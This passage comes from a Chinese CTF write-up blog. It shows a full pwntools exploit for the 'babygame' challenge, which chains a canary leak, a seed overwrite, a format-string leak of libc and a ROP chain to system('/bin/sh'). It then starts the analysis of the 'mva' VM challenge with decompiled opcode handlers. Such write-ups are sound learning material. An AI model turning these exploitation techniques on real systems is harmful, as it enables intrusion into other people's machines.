class="number">4</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span></span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;1&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>)</span><br><span class="line">	leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	stack_addr=leak_addr-<span class="number">528</span></span><br><span class="line">	success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">	success(<span class="string">&#x27;stack_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">	seed=key.srand(<span class="number">0x31313131</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">		p.recvuntil(<span class="string">&#x27;round &#x27;</span>+ <span class="built_in">str</span>(i+<span class="number">1</span>)+ <span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">		num=(key.rand()+<span class="number">1</span>)%<span class="number">3</span></span><br><span class="line">		p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">	</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Good luck to you.\n&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	target_stack=stack_addr-<span class="number">0x8</span></span><br><span class="line">	payload = <span class="string">&quot;%13$p%27$p&quot;</span></span><br><span class="line">	payload +=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x54c2</span>-<span class="number">0x20</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%9$hn&quot;</span></span><br><span class="line">	payload = payload.ljust(<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">	payload = flat([payload,p64(target_stack)])</span><br><span class="line"></span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	canary=<span class="built_in">int</span>((p.recv(<span class="number">16</span>)),<span class="number">16</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	leak_addr=<span class="built_in">int</span>((p.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">	libc_base=leak_addr-<span class="number">280052</span></span><br><span class="line">	</span><br><span class="line">	success(<span class="string">&#x27;canary &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">	success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">	success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">	</span><br><span class="line">	poprdi_ret=<span class="number">0x23b72</span>+libc_base</span><br><span class="line">	ret=<span class="number">0x22679</span>+libc_base</span><br><span class="line">	system_libc=libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">	binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))+libc_base</span><br><span class="line">	</span><br><span class="line">	payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x120</span>-<span class="number">0x18</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">	payload+=p64(poprdi_ret)+p64(binsh)+p64(ret)+p64(system_libc)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;2. paper\n&quot;</span>)</span><br><span class="line">    	log.success(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		sleep(<span class="number">0.5</span>)</span><br><span class="line">		p=process(<span class="string">&#x27;./babygame&#x27;</span>)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			pwn()</span><br><span class="line">		<span class="keyword">except</span> EOFError:</span><br><span class="line">			p.close()</span><br><span class="line">			log.success(<span class="string">&quot;continue!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结</strong></p>
<p>这次比赛我摆烂了，没有出多少力，看着 kernel pwn 和那些我不知道是什么的东西，我感觉我排不上用场了，于是花了一下午去搭了搭 kernel 的环境，后来就出了这道题（我稍微可以摸一摸）</p>
<p>先谈谈我遇到这道题时的“阻力”吧：</p>
<ul>
<li>不知道栈溢出该泄露什么东西<ul>
<li>后面有格式化漏洞，我的第一反应就是泄露“stack_addr”，但是这个canary保护着后面的数据，导致我当时想着先泄露canary，然后再格式化漏洞里面泄露其他东西</li>
</ul>
</li>
<li>如何绕过随机数检测<ul>
<li>这个在当时只卡了一小会（当时那个愚蠢的我还想着全输入“1”来爆破），后来选择覆盖seed，一下子就搞定了</li>
</ul>
</li>
<li>如何绕过canary<ul>
<li>当时我就是卡在了这里，在分析大佬的wp时，我发现大佬把canary给覆盖了，然后去泄露后面的“stack_addr”</li>
<li>我在GDB中发现：当canary被覆盖以后，程序会把原来的返回地址给替换为“异常处理程序”，也就是说，canary报错程序只会在当前函数返回时启动</li>
</ul>
</li>
<li>如何使程序循环<ul>
<li>利用格式化漏洞可以轻易获取canary，但是程序本身没有循环，必须控制某个返回地址来使程序再次执行栈溢出漏洞，在复现时这里也困扰了我一下</li>
<li>后来和大佬交流，发现关键点就是在栈中写入“某个返回地址所在的栈地址”，然后计算偏移进行修改（其实我以前总结过，不过后来忘了）</li>
</ul>
</li>
</ul>
<p>通过本题我把以前丢掉的东西捡了起来，也学了一些新东西</p>
<h2 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h2><p>这是我第一次尝试 VMP pwn</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./mva</span><br><span class="line">[+] Welcome to MVA, input your code now :</span><br><span class="line">aaaaaaaa</span><br><span class="line">bbbbbbbb</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mva: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=b8c5659d20f095ec5c46c6bccb7c6a05d5952b02, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/mva&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>简单修改后的程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v5; <span class="comment">// [rsp+20h] [rbp-240h]</span></span><br><span class="line"></span><br><span class="line">  init_s();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Welcome to MVA, input your code now :&quot;</span>);</span><br><span class="line">  fread(&amp;code, <span class="number">0x100</span>uLL, <span class="number">1uLL</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] MVA is starting ...&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)())((<span class="keyword">char</span> *)&amp;sub_11E8 + <span class="number">1</span>))(); <span class="comment">/* 未知算法 */</span></span><br><span class="line">    v5 = HIBYTE(v3); <span class="comment">/* 分析出错 */</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">0xF</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xF</span>u )</span><br><span class="line">      __asm &#123; jmp     rax &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] MVA is shutting down ...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为IDA无法识别跳转表，必须手动修改：</p>
<ul>
<li>先在IDA的“.rodata”区中找到跳转表（地址“0x206C”）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">000000000000206</span>C unk_206C        db  <span class="number">8B</span>h                 ; DATA XREF: main+<span class="number">134</span>↑o</span><br><span class="line">.rodata:<span class="number">000000000000206</span>C                                         ; main+<span class="number">140</span>↑o</span><br><span class="line">.rodata:<span class="number">000000000000206</span>D                 db <span class="number">0F</span>3h</span><br><span class="line">.rodata:<span class="number">000000000000206</span>E                 db <span class="number">0F</span>Fh</span><br><span class="line">.rodata:<span class="number">000000000000206F</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.rodata:<span class="number">0000000000002070</span>                 db  <span class="number">99</span>h</span><br></pre></td></tr></table></figure>
<ul>
<li>用 TAB 定位“ __asm { jmp     rax } ”的汇编代码位置</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000013</span>D6                 lea     rdx, ds:<span class="number">0</span>[rax*<span class="number">4</span>] <span class="comment">// target</span></span><br><span class="line">.text:<span class="number">00000000000013</span>DE                 lea     rax, unk_206C</span><br><span class="line">.text:<span class="number">00000000000013E5</span>                 mov     eax, [rdx+rax]</span><br><span class="line">.text:<span class="number">00000000000013E8</span>                 cdqe</span><br><span class="line">.text:<span class="number">00000000000013</span>EA                 lea     rdx, unk_206C</span><br><span class="line">.text:<span class="number">00000000000013F</span>1                 add     rax, rdx</span><br><span class="line">.text:<span class="number">00000000000013F</span>4                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">00000000000013F</span>4                 jmp     rax</span><br></pre></td></tr></table></figure>
<ul>
<li>在第一个“unk_206C”前进行修改（下面第二个记得勾）</li>
</ul>
<img src="/2022/03/25/%E8%99%8E%E7%AC%A6CTF2022/1648043452770.png" class width="1648043452770">  
<p>修改完成，并且进行了一些优化后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+1Ah] [rbp-246h]</span></span><br><span class="line">  __int16 v5; <span class="comment">// [rsp+1Ch] [rbp-244h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 key; <span class="comment">// [rsp+20h] [rbp-240h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> enc_num; <span class="comment">// [rsp+24h] [rbp-23Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+28h] [rbp-238h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-230h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+44h] [rbp-21Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+4Ch] [rbp-214h]</span></span><br><span class="line">  __int16 v12[<span class="number">260</span>]; <span class="comment">// [rsp+50h] [rbp-210h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+258h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_s();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Welcome to MVA, input your code now :&quot;</span>);</span><br><span class="line">  fread(&amp;code, <span class="number">0x100</span>uLL, <span class="number">1uLL</span>, <span class="built_in">stdin</span>); <span class="comment">/* 输入code */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] MVA is starting ...&quot;</span>);</span><br><span class="line">LABEL_102:</span><br><span class="line">  <span class="keyword">while</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    enc_num = enc();</span><br><span class="line">    key = HIBYTE(enc_num); <span class="comment">/* HIWORD 取8bits高4bits */</span></span><br><span class="line">    <span class="keyword">if</span> ( key &gt; <span class="number">0xF</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( key &lt;= <span class="number">0xF</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( key )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">          v5 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = enc_num;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) + *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) - *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) &amp; *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) | *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = (<span class="keyword">int</span>)*((<span class="keyword">unsigned</span> __int16 *)&amp;v10 + SBYTE2(enc_num)) &gt;&gt; *((_WORD *)&amp;v10 + SBYTE1(enc_num));</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) ^ *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">          JUMPOUT(<span class="number">0x1780</span>LL);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( v9 &gt; <span class="number">256</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( BYTE2(enc_num) )</span><br><span class="line">            v12[v9] = enc_num;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v12[v9] = v10;</span><br><span class="line">          ++v9;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xA</span>u:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v9 )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = v12[--v9];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xB</span>u:</span><br><span class="line">          v8 = enc();</span><br><span class="line">          <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">            index = v8;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xC</span>u:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          v4 = *((_WORD *)&amp;v10 + SBYTE2(enc_num)) == *((_WORD *)&amp;v10 + SBYTE1(enc_num));</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xD</span>u:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) * *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xE</span>u:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE1(enc_num)) = *((_WORD *)&amp;v10 + SBYTE2(enc_num));</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xF</span>u:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="keyword">unsigned</span> __int16)v12[v9]);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">LABEL_8:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span 